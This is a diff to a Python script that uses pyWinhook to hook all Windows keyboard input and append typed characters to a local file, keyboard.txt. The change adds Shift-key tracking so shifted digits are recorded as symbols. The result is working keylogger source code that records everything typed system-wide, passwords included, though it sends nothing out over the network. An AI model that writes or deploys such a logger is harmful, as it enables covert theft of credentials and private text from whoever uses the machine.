@@ -1,6 +1,10 @@
 import pyWinhook
 import pythoncom
-storage = ""
+import time
+from datetime import datetime
+
+end_time = time.time()
+flag = 0
 
 
 # 监听到鼠标事件调用
@@ -28,8 +32,12 @@ def onKeyboardEvent(event):
     Returns:
         若输出为False,则销毁事件
     """
-    global storage
+    global flag
+    global end_time
+    # print("Key:", event.Key)
+    # print("KeyID:", event.KeyID)
     candi = str(event.Key)
+    print(candi)
     if candi.isdigit() or candi.isalpha() or candi.isspace():
         with open("keyboard.txt", 'a+') as f:
             if candi.isupper():
@@ -38,8 +46,42 @@ def onKeyboardEvent(event):
                 f.write(" ")
             elif candi == 'Return':
                 f.write('\n')
-            elif candi.isdigit() or candi.islower() or candi.isnumeric():
-                f.write(candi)
+            elif candi.isdigit():
+                if flag == 1:
+                    '''and time.time() - end_time <= 1'''
+                    chart = ")!@#$%^&*("
+                    f.write(chart[int(candi)])
+                else:
+                    f.write(candi)
+            elif candi == 'Lshift' or candi == 'Rshift':
+                flag = 1
+                end_time = time.time()
+
+    return True
+
+
+def onKeyboardEvent2(event):
+    """
+
+    Args:
+        event: 键盘输入的事件
+
+    Returns:
+        若输出为False,则销毁事件
+    """
+    global flag
+    global end_time
+    # print("Key:", event.Key)
+    # print("KeyID:", event.KeyID)
+    candi = str(event.Key)
+    print(candi)
+    if candi.isdigit() or candi.isalpha() or candi.isspace():
+        with open("keyboard.txt", 'a+') as f:
+            if candi == 'Lshift' or candi == 'Rshift':
+                print('UPUPUP!')
+                flag = 0
+                end_time = time.time()
+
     return True
 
 
@@ -54,6 +96,7 @@ def main():
     hm = pyWinhook.HookManager()
     # 监听键盘
     hm.KeyDown = onKeyboardEvent
+    hm.KeyUp = onKeyboardEvent2
     hm.HookKeyboard()
     # 循环监听
     pythoncom.PumpMessages()
